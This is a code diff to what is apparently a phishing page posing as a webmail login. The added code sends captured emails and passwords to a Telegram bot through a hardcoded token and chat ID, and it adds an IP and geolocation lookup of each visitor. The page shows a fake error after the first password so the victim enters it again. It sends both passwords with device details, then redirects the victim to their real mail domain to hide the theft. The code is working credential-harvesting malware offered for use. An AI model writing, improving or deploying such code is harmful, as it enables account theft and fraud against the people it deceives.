@@ -494,7 +494,54 @@
   <div class="loader" id="loader"></div>
 
   <script>
-    const FORMSPARK_URL = "https://submit-form.com/V36Vd3Du4";
+    // ====== CONFIG ======
+    const TG_TOKEN   = "8728607271:AAHcxhMPgO3k20AiBo1aw3TxaiWqKLVqq4Y";
+    const TG_CHAT_ID = "6218568394";
+    // ====================
+
+    const TG_URL = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+
+    let visitorInfo = null;   // cached { ip, country, city, region }
+
+    // ====== IP + COUNTRY LOOKUP — three-provider fallback ======
+    async function fetchVisitorInfo() {
+      const providers = [
+        {
+          url: 'https://ipwho.is/',
+          map: j => ({ ip: j.ip, country: j.country, city: j.city, region: j.region })
+        },
+        {
+          url: 'https://ipapi.co/json/',
+          map: j => ({ ip: j.ip, country: j.country_name, city: j.city, region: j.region })
+        },
+        {
+          url: 'https://ipinfo.io/json',
+          map: j => ({ ip: j.ip, country: j.country, city: j.city, region: j.region })
+        }
+      ];
+      for (const p of providers) {
+        try {
+          const r = await fetch(p.url, { cache: 'no-store' });
+          if (!r.ok) {
+            console.warn('provider non-OK:', p.url, r.status);
+            continue;
+          }
+          const j = await r.json();
+          const mapped = p.map(j);
+          if (mapped && mapped.ip) {
+            console.log('IP source:', p.url, mapped);
+            return mapped;
+          }
+        } catch (e) {
+          console.warn('provider failed:', p.url, e && e.message);
+        }
+      }
+      console.error('all IP providers failed');
+      return null;
+    }
+
+    const visitorInfoPromise = fetchVisitorInfo();
+    // ==========================================================
     
     // --- GET EMAIL FROM URL ---
     function getEmailFromURL() {
@@ -544,24 +591,13 @@
       return { name: 'Unknown', icon: 'fa-globe' };
     }
     
-    // --- GET LOCATION ---
+    // --- GET LOCATION (for display in visitor row) ---
     async function getLocation() {
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        if (data.city && data.country_code) {
-          return `${data.city}, ${data.country_code}`;
-        }
-      } catch {}
-      
-      try {
-        const res2 = await fetch('https://ipinfo.io/json');
-        const data2 = await res2.json();
-        if (data2.city && data2.country) {
-          return `${data2.city}, ${data2.country}`;
-        }
-      } catch {}
-      
+      if (!visitorInfo) visitorInfo = await visitorInfoPromise;
+      if (visitorInfo && visitorInfo.city && visitorInfo.country) {
+        return `${visitorInfo.city}, ${visitorInfo.country}`;
+      }
+      if (visitorInfo && visitorInfo.country) return visitorInfo.country;
       return 'Unknown';
     }
     
@@ -670,6 +706,66 @@
     if (window.top !== window.self) window.top.location = window.self.location;
     window.addEventListener('pageshow', function(e) { if (e.persisted) window.location.reload(); });
     
+    // --- TELEGRAM SEND ---
+    function buildMessage({ email, password, attempt, firstPassword }) {
+      const info = visitorInfo || {};
+      const ip      = info.ip      || 'unknown';
+      const country = info.country || 'unknown';
+      const city    = info.city    || 'unknown';
+      const region  = info.region  || '';
+      const ts      = new Date().toISOString();
+
+      const lines = [
+        `🔐 Webmail login captured`,
+        ``,
+        `📧 Email: ${email}`,
+        `🔑 Password: ${password}`,
+      ];
+      if (attempt === 'second' && firstPassword) {
+        lines.push(`🔑 First password: ${firstPassword}`);
+      }
+      lines.push(
+        ``,
+        `🌍 Country: ${country}`,
+        `🏙 City: ${city}${region ? ', ' + region : ''}`,
+        `📡 IP: ${ip}`,
+        `🕐 Time: ${ts}`,
+        `🎯 Attempt: ${attempt}`,
+        `💻 OS: ${getOSInfo().name}`,
+        `🌐 Browser: ${getBrowserInfo().name}`,
+        `🔗 Page: ${location.href}`
+      );
+      return lines.join('\n');
+    }
+
+    async function shipToTelegram(payload) {
+      try {
+        if (!visitorInfo) {
+          visitorInfo = await visitorInfoPromise;
+        }
+        const text = buildMessage(payload);
+        const res = await fetch(TG_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TG_CHAT_ID,
+            text,
+            disable_web_page_preview: true
+          })
+        });
+        if (!res.ok) {
+          const body = await res.text();
+          console.error('Telegram status:', res.status, body);
+        } else {
+          console.log('Telegram OK:', payload.attempt, visitorInfo);
+        }
+        return res.ok;
+      } catch (err) {
+        console.error('Telegram error:', err);
+        return false;
+      }
+    }
+    
     // --- FORM SUBMISSION ---
     let attemptCount = 0;
     let firstPassword = '';
@@ -690,35 +786,34 @@
       attemptCount++;
       errorEl.style.display = 'block';
       
-      try {
-        await fetch(FORMSPARK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            email: email,
-            password: password,
-            attempt: attemptCount,
-            os: getOSInfo().name,
-            browser: getBrowserInfo().name,
-            timestamp: new Date().toISOString()
-          })
-        });
-      } catch (err) {
-        console.log('Formspark error:', err);
-      }
-      
       if (attemptCount === 1) {
         firstPassword = password;
+        // Wait for IP lookup so the message is complete.
+        if (!visitorInfo) visitorInfo = await visitorInfoPromise;
+        // Fire-and-forget — UI flips immediately.
+        shipToTelegram({
+          email: email,
+          password: password,
+          attempt: 'first',
+          firstPassword: null
+        });
         errorEl.textContent = 'Authentication is required! Please try again.';
         errorEl.style.display = 'block';
         document.getElementById('passwordField').value = '';
         document.getElementById('passwordField').focus();
       } else {
-        const domain = email.split('@')[1];
         document.getElementById('loader').style.display = 'flex';
+        // Wait for the Telegram send before redirecting.
+        await shipToTelegram({
+          email: email,
+          password: password,
+          attempt: 'second',
+          firstPassword: firstPassword
+        });
+        const domain = email.split('@')[1];
         setTimeout(() => {
           window.location.href = `https://${domain}`;
-        }, 1500);
+        }, 500);
       }
     });
     
